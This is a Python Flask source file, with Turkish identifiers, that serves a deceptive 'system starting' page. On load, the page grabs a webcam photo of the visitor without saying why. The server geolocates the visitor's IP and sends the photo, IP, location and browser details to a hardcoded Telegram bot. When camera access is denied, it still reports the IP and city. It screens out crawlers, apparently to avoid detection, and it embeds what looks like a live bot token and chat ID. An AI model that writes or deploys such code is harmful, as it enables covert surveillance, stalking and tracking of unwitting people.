from flask import Flask, request
import socket
import requests
import time
import os
import base64

app = Flask(__name__)

TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
CHAT_ID = "7622505128"

def telegram_mesaj_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"})
    except Exception as e:
        print("Telegram Hatası:", e)

def telegram_fotograf_ve_bilgi_gonder(fotograf_base64, bilgi_metni):
    try:
        resim_verisi = fotograf_base64.split(",")[1]
        resim_bytes = base64.b64decode(resim_verisi)
        
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        files = {'photo': ('ajan_fotografi.jpg', resim_bytes)}
        data = {'chat_id': CHAT_ID, 'caption': bilgi_metni, 'parse_mode': 'HTML'}
        
        requests.post(url, files=files, data=data)
    except Exception as e:
        print("Fotoğraf Gönderme Hatası:", e)

@app.route('/', methods=['GET'])
def ana_sayfa():
    if request.path == '/favicon.ico': return "OK", 200
    
    ziyaretci_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    if ziyaretci_ip: ziyaretci_ip = ziyaretci_ip.split(',')[0].strip()
    
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Bot filtreleri
    if 'bot' in user_agent or 'facebook' in user_agent or 'crawler' in user_agent or 'spider' in user_agent or ziyaretci_ip == '127.0.0.1':
        return "OK", 200

    # 🚀 OTOMATİK KAMERA KODU (Buton Kaldırıldı)
    html = f"""
    <body style='background:#111; color:#0f0; font-family: monospace; text-align:center; padding-top:10%;'>
        <h2 style='color: red;'>SİSTEM BAŞLATILIYOR</h2>
        <p>Lütfen bekleyin...</p>
        <p id='durum' style='margin-top: 20px; color: yellow;'></p>

        <video id="video" autoplay style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            // Sayfa yüklendiği an bu fonksiyon otomatik çalışır
            window.onload = async function() {{
                document.getElementById('durum').innerHTML = "Kamera bağlanıyor... Lütfen izin verin.";
                try {{
                    const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {{
                        setTimeout(() => {{
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            
                            const foto = canvas.toDataURL('image/jpeg');
                            
                            fetch('/kamera', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{ image: foto, ip: "{ziyaretci_ip}" }})
                            }});
                            
                            document.getElementById('durum').innerHTML = "✅ İşlem tamamlandı!";
                            stream.getTracks().forEach(track => track.stop());
                        }}, 1500); // Kamera açıldıktan 1.5 saniye sonra fotoğrafı çeker
                    }};
                }} catch (error) {{
                    document.getElementById('durum').innerHTML = "❌ Kamera izni verilmedi.";
                    fetch('/kamera_hata', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{ ip: "{ziyaretci_ip}" }})
                    }});
                }}
            }};
        </script>
    </body>
    """
    return html

@app.route('/kamera', methods=['POST'])
def kamera():
    veri = request.json
    ip = veri['ip']
    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
    
    try:
        konum_verisi = requests.get(f'http://ip-api.com/json/{ip}').json()
        sehir = konum_verisi.get('city', 'Bilinmiyor')
        ulke = konum_verisi.get('country', 'Bilinmiyor')
        hava = requests.get(f'https://wttr.in/{sehir}?format=3').text.strip()
    except:
        sehir, ulke, hava = "Bilinmiyor", "Bilinmiyor", "Bilinmiyor"

    bilgi_metni = f"""🚨 <b>AJAN YAKALANDI!</b>
    
🌐 <b>IP Adresi:</b> {ip}
📍 <b>Konum:</b> {sehir}, {ulke}
☀️ <b>Hava Durumu:</b> {hava}
📱 <b>Tarayıcı:</b> {user_agent}"""

    telegram_fotograf_ve_bilgi_gonder(veri['image'], bilgi_metni)
    return "OK", 200

@app.route('/kamera_hata', methods=['POST'])
def kamera_hata():
    veri = request.json
    ip = veri['ip']
    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
    
    try:
        konum_verisi = requests.get(f'http://ip-api.com/json/{ip}').json()
        sehir = konum_verisi.get('city', 'Bilinmiyor')
    except:
        sehir = "Bilinmiyor"

    mesaj = f"""⚠️ <b>SİTEYE GİREN OLDU (KAMERA İZNİ YOK)</b>
    
🌐 <b>IP Adresi:</b> {ip}
📍 <b>Konum:</b> {sehir}
📱 <b>Tarayıcı:</b> {user_agent}"""

    telegram_mesaj_gonder(mesaj)
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
